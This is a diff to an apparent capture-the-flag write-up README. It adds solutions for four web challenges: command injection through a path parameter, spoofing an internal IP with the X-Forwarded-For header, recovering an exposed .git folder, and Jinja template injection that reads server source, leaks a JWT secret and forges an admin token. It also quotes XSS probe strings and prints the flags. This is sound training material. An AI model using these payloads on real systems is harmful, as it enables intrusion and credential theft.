@@ -15,7 +15,8 @@ training.
 
 ## Challenges
 
-### Binary
+<details>
+<summary><b>Binary</b></summary>
 
 - [BE01](#be01)
 - [BE02](#be02)
@@ -26,7 +27,10 @@ training.
 - [BX01](#bx01)
 - [BX02](#bx02)
 
-### Crypto
+</details>
+
+<details>
+<summary><b>Crypto</b></summary>
 
 - [CM01](#cm01)
 - [CM02](#cm02)
@@ -34,7 +38,10 @@ training.
 - [CH02](#ch02)
 - [CX01](#cx01)
 
-### Forensics
+</details>
+
+<details>
+<summary><b>Forensics</b></summary>
 
 - [FE01](#fe01)
 - [FE02](#fe02)
@@ -45,12 +52,18 @@ training.
 - [FM03](#fm03)
 - [FH01](#fh01)
 
-### Networking
+</details>
+
+<details>
+<summary><b>Networking</b></summary>
 
 - [NE01](#ne01)
 - [NM01](#nm01)
 
-### Web
+</details>
+
+<details>
+<summary><b>Web</b></summary>
 
 - [WE01](#we01)
 - [WE02](#we02)
@@ -58,13 +71,12 @@ training.
 - [WM02](#wm02)
 - [WM03](#wm03)
 - [WM04](#wm04)
+- [WM05](#wm05)
+- [WH01](#wh01)
+- [WH02](#wh02)
+- [WX01](#wx01)
 
-## To Do
-
-- [ ] WM05
-- [ ] WH01
-- [ ] WH02
-- [ ] WX01
+</details>
 
 ---
 
@@ -1988,3 +2000,462 @@ If we look at this line in the error:
 We notice the flag is being passed in the `template` variable. Let's try calling it:
 
 ![wm04_1.png](img/screenshots/wm04_1.png)
+
+---
+
+## WM05
+
+![Points: 250](https://img.shields.io/badge/Points-250-blue)
+
+**Challenge Category**
+
+![Web](https://img.shields.io/badge/Web-brightgreen)
+
+**Challenge Description**
+
+```
+Access the site at https://cfta-wm05.allyourbases.co, then find and read the contents of the flag file, to get the flag.
+```
+
+**Flag**
+
+```
+bh%3kx9j75%3k2*7!n
+```
+
+### Solution
+
+![wm05_index.png](img/screenshots/wm05_index.png)
+
+For this challenge, we have a site which lets you interactively browse a host's file system. If we check the source code, we see it's retrieving the directories by sending a POST request with the `path` parameter.
+
+![wm05_1.png](img/screenshots/wm05_1.png)
+
+Let's try maniupulating the request to see if we can get command injection:
+
+![wm05_2.png](img/screenshots/wm05_2.png)
+
+Looks like it works! Now, let's pick any empty directory to clean up our output and continue enumerating.
+
+![wm05_3.png](img/screenshots/wm05_3.png)
+
+It looks like the remote host is filtering characters out. It doesn't look like we're allowed to send spaces. We can easily get around this by using brace expansion.
+
+![wm05_4.png](img/screenshots/wm05_4.png)
+
+Interestingly enough, we see a hidden directory named `...`.
+
+![wm05_5.png](img/screenshots/wm05_5.png)
+
+Look's like we've found the flag. Now all we have to do is read it.
+
+![wm05_6.png](img/screenshots/wm05_6.png)
+
+---
+
+## WH01
+
+![Points: 500](https://img.shields.io/badge/Points-500-blue)
+
+**Challenge Category**
+
+![Web](https://img.shields.io/badge/Web-brightgreen)
+
+**Challenge Description**
+
+```
+Access the site at https://cfta-wh01.allyourbases.co and find a way to get the flag from the CMS.
+```
+
+**Flag**
+
+```
+iPSpooFinGWiThHopHeaDers91918
+```
+
+### Solution
+
+![wh01_index.png](img/screenshots/wh01_index.png)
+
+This challenge involves pentesting a custom Content Management System (CMS). The home page has nothing on it other than a single entry with `Today I did some stuff...`. We don't even have any links to other pages or source code to exploit.
+
+Given the lack of leads, we have to resort to scanning the site for hidden pages and directories.
+
+```bash
+$ gobuster dir -q -u https://cfta-wh01.allyourbases.co/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -b 400,403,404 -e
+https://cfta-wh01.allyourbases.co/?mod=node&nid=some_thing&op=view (Status: 200) [Size: 616]
+https://cfta-wh01.allyourbases.co/?mod=some_thing&op=browse (Status: 200) [Size: 616]
+https://cfta-wh01.allyourbases.co/?Open                (Status: 200) [Size: 616]
+https://cfta-wh01.allyourbases.co/?OpenServer          (Status: 200) [Size: 616]
+https://cfta-wh01.allyourbases.co/?mod=<script>alert(document.cookie)</script>&op=browse (Status: 200) [Size: 616]
+https://cfta-wh01.allyourbases.co/admin.html           (Status: 304) [Size: 0]
+https://cfta-wh01.allyourbases.co/?sql_debug=1         (Status: 200) [Size: 616]
+https://cfta-wh01.allyourbases.co/?wp-cs-dump          (Status: 200) [Size: 616]
+https://cfta-wh01.allyourbases.co/?PageServices        (Status: 200) [Size: 616]
+https://cfta-wh01.allyourbases.co/readme.txt           (Status: 200) [Size: 154]
+https://cfta-wh01.allyourbases.co/?pattern=/etc/*&sort=name (Status: 200) [Size: 616]
+https://cfta-wh01.allyourbases.co/soap/servlet/soaprouter (Status: 200) [Size: 0]
+https://cfta-wh01.allyourbases.co/?M=A                 (Status: 200) [Size: 616]
+https://cfta-wh01.allyourbases.co/?N=D                 (Status: 200) [Size: 616]
+https://cfta-wh01.allyourbases.co/?D=A                 (Status: 200) [Size: 616]
+https://cfta-wh01.allyourbases.co/?S=A                 (Status: 200) [Size: 616]
+https://cfta-wh01.allyourbases.co/?\"><script>alert('Vulnerable');</script> (Status: 200) [Size: 616]
+```
+
+We can probably ignore everything beginning with a `?`, since that probably just leads back to the index page. However, we have two interesting files to look further into: `readme.txt` and `admin.html`. Let's start with `readme.txt`.
+
+```bash
+$ curl https://cfta-wh01.allyourbases.co/readme.txt
+To use the CMS make sure to visit /admin.html from allowed IPs on the local network.
+
+Note: Tell engineering to stop moving the subnet from 192.168.0.0/24
+```
+
+Interesting... It appears `admin.html` can only be allowed from certain IPs on the `192.168.0.0/24` network. We can easily spoof an internal IP by using the `X-Forwarded-For` header in our request. Let's try to brute force it:
+
+```bash
+$ for i in {1..254}; do curl -s https://cfta-wh01.allyourbases.co/admin.html -H "X-Forwarded-For: 192.168.0.$i" | grep . && echo "Page found using: 192.168.0.$i"; break; done
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>My Blog</title>
+    <link rel="stylesheet" href="mysite.css">
+</head>
+<body>
+<div class="main">
+    <div class="center">
+        <div class="header">
+            <h1>Admin</h1>
+        </div>
+        <div class="content flag">
+            <h2>Flag</h2>
+            iPSpooFinGWiThHopHeaDers91918
+        </div>
+        <div class="footer">
+            Powered By: mycustomcms 2021
+        </div>
+    </div>
+</div>
+</body>
+</html>
+Page found using: 192.168.0.62
+```
+
+---
+
+## WH02
+
+![Points: 500](https://img.shields.io/badge/Points-500-blue)
+
+**Challenge Category**
+
+![Web](https://img.shields.io/badge/Web-brightgreen)
+
+**Challenge Description**
+
+```
+Access the site at https://cfta-wh02.allyourbases.co and find a way to get the flag.
+```
+
+**Flag**
+
+```
+giTisAGreat_ResoURCe8337
+```
+
+### Solution
+
+![wh02_index.png](img/screenshots/wh02_index.png)
+
+For this challenge, we are given a list of coding best practices. The last line, `Use version control!`, is a huge hint towards checking for version control files. The most popular (by a gigantic margin) version control tool is `git`, which we can check for by looking for a `.git` folder.
+
+```bash
+$ curl https://cfta-wh02.allyourbases.co/.git/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Directory listing for /.git/</title>
+</head>
+<body>
+<h1>Directory listing for /.git/</h1>
+<hr>
+<ul>
+<li><a href="branches/">branches/</a></li>
+<li><a href="COMMIT_EDITMSG">COMMIT_EDITMSG</a></li>
+<li><a href="config">config</a></li>
+<li><a href="description">description</a></li>
+<li><a href="HEAD">HEAD</a></li>
+<li><a href="hooks/">hooks/</a></li>
+<li><a href="index">index</a></li>
+<li><a href="info/">info/</a></li>
+<li><a href="logs/">logs/</a></li>
+<li><a href="objects/">objects/</a></li>
+<li><a href="refs/">refs/</a></li>
+</ul>
+<hr>
+</body>
+</html>
+```
+
+Looks like there's a publicly exposed `.git`. We can extract it with a browser extension called [DotGit](https://github.com/davtur19/DotGit).
+
+![wh02_1.png](img/screenshots/wh02_1.png)
+
+Once we download it, we just check the git repo for modified files.
+
+```bash
+$ unzip cfta-wh02_allyourbases_co.zip && cd cfta-wh02_allyourbases_co
+$ git show
+commit 278b83e3c9dfe29f7eb7fdafd4765532c2a1fbc6 (HEAD -> master)
+Author: Joe Bloggs <j.bloggs@allyourbases.io>
+Date:   Sun Mar 7 12:40:54 2021 -0800
+
+    Production version.
+
+diff --git a/index.html b/index.html
+index 29a1428..edb4ed2 100644
+--- a/index.html
++++ b/index.html
+@@ -1,9 +1,18 @@
+ <html>
+     <head>
+-        <title>TEST</title>
++        <title>Coding Standards - Best Practices</title>
+     </head>
+     <body>
+-        <!-- Testing site infrastrucure. No one is going to see this anyway.-->
+-        <div>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed pellentesque, mauris sit amet convallis auctor, felis quam viverra felis, quis tempor lectus tortor ut eros. Maecenas eget dapibus lacus. Donec scelerisque risus ac neque congue, et congue justo posuere. Quisque et sem odio. Sed non egestas ante. Etiam nec nibh ac arcu maximus lobortis in nec nisi. Curabitur sed tellus pretium, hendrerit nulla sed, finibus purus.</div>
++        <h1>Coding Standards - Best Practices</h1>
++        <ol>
++            <li>Use consistent indentation.</li>
++            <li>Follow the DRY principle.</li>
++            <li>Avoid deep nesting.</li>
++            <li>Limit line length.</li>
++            <li>Avoid putting all your code into one or two files.</li>
++            <li>Consistent naming conventions.</li>
++            <li>Keep your code simple.</li>
++            <li>Use version control!</li>
++        </ol>
+     </body>
+ </html>
+\ No newline at end of file
+diff --git a/setup.sh b/setup.sh
+deleted file mode 100644
+index dc5e9b1..0000000
+--- a/setup.sh
++++ /dev/null
+@@ -1,8 +0,0 @@
+-#!/bin/bash
+-
+-FLAG="giTisAGreat_ResoURCe8337"
+-
+-cd build
+-cp ../sitedata.zip sitedata.zip
+-unzip sitedata.zip
+-
+```
+
+---
+
+## WX01
+
+![Points: 1000](https://img.shields.io/badge/Points-1000-blue)
+
+**Challenge Category**
+
+![Web](https://img.shields.io/badge/Web-brightgreen)
+
+**Challenge Description**
+
+```
+Access the url at: https://cfta-wx01.allyourbases.co and find a way to login to the admin portal to get the flag.
+
+Note: You have been provided with the following credentials to help you:
+
+username: tim
+
+password: berners-lee
+```
+
+**Flag**
+
+```
+muLtiStagingIT710-12
+```
+
+### Solution
+
+![wx01_index.png](img/screenshots/wx01_index.png)
+
+For this challenge, we need to figure out a way to retrieve the flag from the admin console. We are given login credentials, so logging in isn't the issue. However, despite being able to log in, we are presented with a message saying we have "Insufficient Privileges" to view the flag. If we check the source code, we can see why. There are three functions provided in the source:
+
+```javascript
+function verify(token) {
+    $.ajax({
+        type: "POST",
+        url: 'https://6feducn4d2.execute-api.eu-west-1.amazonaws.com/stag/wx01',
+        contentType: 'application/json',
+        data: JSON.stringify({
+            'action': 'verify',
+            'token': token
+        }),
+        success: function (res) {
+            if (res.body === "Invalid Token") {
+                $(".output").empty().append("Invalid Authentication Token");
+            } else if (res.body === "Insufficient Privileges") {
+                $(".output").empty().append("Insufficient Privileges");
+            } else {
+                $(".output").empty().append("Flag: " + res.body);
+            }
+        },
+        error: function (err) {
+            console.log(err);
+        }
+    })
+};
+
+function login(username, password) {
+    $.ajax({
+        type: "POST",
+        url: 'https://6feducn4d2.execute-api.eu-west-1.amazonaws.com/stag/wx01',
+        contentType: 'application/json',
+        data: JSON.stringify({
+            'action': 'login',
+            'username': username,
+            'password': password
+        }),
+        success: function (res) {
+            if (res.body !== "Login Failed") {
+                verify(res.body);
+            } else {
+                $(".output").empty().append("Login Failed");
+            }
+        },
+        error: function (err) {
+            console.log(err);
+        }
+    })
+};
+
+function help(email) {
+    $.ajax({
+        type: "POST",
+        url: 'https://6feducn4d2.execute-api.eu-west-1.amazonaws.com/stag/wx01',
+        contentType: 'application/json',
+        data: JSON.stringify({
+            'action': 'help',
+            'email': email
+        }),
+        success: function (res) {
+            $(".output").empty().append(res.body);
+        },
+        error: function (err) {
+            console.log(err);
+        }
+    })
+};
+```
+
+The first function, `verify`, explains why we aren't able to see the flag. The server is looking for a specific token, likely the `admin` token, before it will reveal the flag. We can take a look at the `login` function to see how to retrieve the token. When we attempt to login, it sends the credentials to a remote host to validate.
+
+```bash
+$ curl -s https://6feducn4d2.execute-api.eu-west-1.amazonaws.com/stag/wx01 -X POST -d '{"action":"login","username":"tim","password":"berners-lee"}' | json_pp
+{
+   "body" : "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRpbSIsInJvbGUiOiJ1c2VyIn0.j8wX114OSLEo2I4S6GQ4wQ4ZszXtyp0wFc0lpwc1yRQ",
+   "statusCode" : 200
+}
+```
+
+It looks like the server returns a JSON Web Token (JWT) in the response. Let's use an [online tool](https://jwt.io/) to look at this token.
+
+![wx01_2.png](img/screenshots/wx01_1.png)
+
+It looks like all we need to do is change the `role` value to `admin` in the paload. However, as we can see with the `Invalid Signature` warning, we need to have the secret key in order to forge the JWT.
+
+Let's take a closer look at the `help` function to see if that might be able to help us recover the secret.
+
+```bash
+$ curl -s https://6feducn4d2.execute-api.eu-west-1.amazonaws.com/stag/wx01 -X POST -d '{"action":"help","email":"email"}' | json_pp
+{
+   "body" : "\n    <p>Your request has been submitted.</p>\n    <p>You will receive an email at: email</p>\n    <p>This might take a reaaaaaaally long time though (forever).</p>\n    ",
+   "statusCode" : 200
+}
+```
+
+After some messing around, we find the server is using Jinja to handle requests. If we send a `{{}}` to the server, we get this:
+
+```bash
+$ curl -s https://6feducn4d2.execute-api.eu-west-1.amazonaws.com/stag/wx01 -X POST -d '{"action":"help","email":"{{}}"}' | json_pp
+{
+   "errorMessage" : "Expected an expression, got 'end of print statement'",
+   "errorType" : "TemplateSyntaxError",
+   "stackTrace" : [
+      "  File \"/var/task/lambda_function.py\", line 64, in lambda_handler\n    'body': handle(event)\n",
+      "  File \"/var/task/lambda_function.py\", line 52, in handle\n    res = getHelp(event)\n",
+      "  File \"/var/task/lambda_function.py\", line 18, in getHelp\n    msg = Template(template).render(dir=dir, help=help, locals=locals, globals=globals, open=open)\n",
+      "  File \"/var/task/jinja2/environment.py\", line 1031, in __new__\n    return env.from_string(source, template_class=cls)\n",
+      "  File \"/var/task/jinja2/environment.py\", line 941, in from_string\n    return cls.from_code(self, self.compile(source), globals, None)\n",
+      "  File \"/var/task/jinja2/environment.py\", line 638, in compile\n    self.handle_exception(source=source_hint)\n",
+      "  File \"/var/task/jinja2/environment.py\", line 832, in handle_exception\n    reraise(*rewrite_traceback_stack(source=source))\n",
+      "  File \"/var/task/jinja2/_compat.py\", line 28, in reraise\n    raise value.with_traceback(tb)\n",
+      "  File \"<unknown>\", line 3, in template\n"
+   ]
+}
+```
+
+If we look at this line in the response:
+
+```bash
+"  File \"/var/task/lambda_function.py\", line 18, in getHelp\n    msg = Template(template).render(dir=dir, help=help, locals=locals, globals=globals, open=open)\n"
+```
+
+We can see the `open` function is available for use. We know the file is `/var/task/lambda_function.py` based on the error outputs, so let's try to use the `open` function to read the source code.
+
+```bash
+$ curl -s https://6feducn4d2.execute-api.eu-west-1.amazonaws.com/stag/wx01 -X POST -d '{"action":"help","email":"{{open(\"/var/task/lambda_function.py\").read()}}"}' | json_pp
+{
+   "body" : "\n    <p>Your request has been submitted.</p>\n    <p>You will receive an email at: from jinja2 import Template\nimport json\nimport urllib\nimport jwt\nimport os\n\n# JWT Key\nkey = \"aversion-chute-freeway-corporal\"\nalgo = \"HS256\"\n\ndef getHelp(event):\n    email = ''.join(event['email'])\n    template = \"\"\"\n    <p>Your request has been submitted.</p>\n    <p>You will receive an email at: %s</p>\n    <p>This might take a reaaaaaaally long time though (forever).</p>\n    \"\"\" % (urllib.parse.unquote(email).replace(\"<\", \"&lt;\").replace(\">\", \"&gt;\"))\n    msg = Template(template).render(dir=dir, help=help, locals=locals, globals=globals, open=open)\n    msg = msg[:-len(msg)+700]\n    return msg\n\ndef login(event)",
+   "statusCode" : 200
+}
+```
+
+Here's a cleaned up version of the body text:
+
+```python
+    <p>Your request has been submitted.</p>
+    <p>You will receive an email at: from jinja2 import Template
+import json
+import urllib
+import jwt
+import os
+
+# JWT Key
+key = "aversion-chute-freeway-corporal"
+algo = "HS256"
+
+def getHelp(event):
+    email = ''.join(event['email'])
+    template = """
+    <p>Your request has been submitted.</p>
+    <p>You will receive an email at: %s</p>
+    <p>This might take a reaaaaaaally long time though (forever).</p>
+    """ % (urllib.parse.unquote(email).replace("<", "&lt;").replace(">", "&gt;"))
+    msg = Template(template).render(dir=dir, help=help, locals=locals, globals=globals, open=open)
+    msg = msg[:-len(msg)+700]
+    return msg
+
+def login(event)
+```
+
+It looks like it worked. We were able to dump the source code and the key for the JWT. Now we can modify our payload and send it.
+
+![wx01_2.png](img/screenshots/wx01_2.png)
+
+```bash
+$ curl -s https://6feducn4d2.execute-api.eu-west-1.amazonaws.com/stag/wx01 -X POST -d '{"action":"verify","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRpbSIsInJvbGUiOiJhZG1pbiJ9.S9-09o2b55F1WD2Fgyam6R-aL_CM93EaetWVIDB9-ks"}' | json_pp
+{
+   "body" : "muLtiStagingIT710-12",
+   "statusCode" : 200
+}
+```
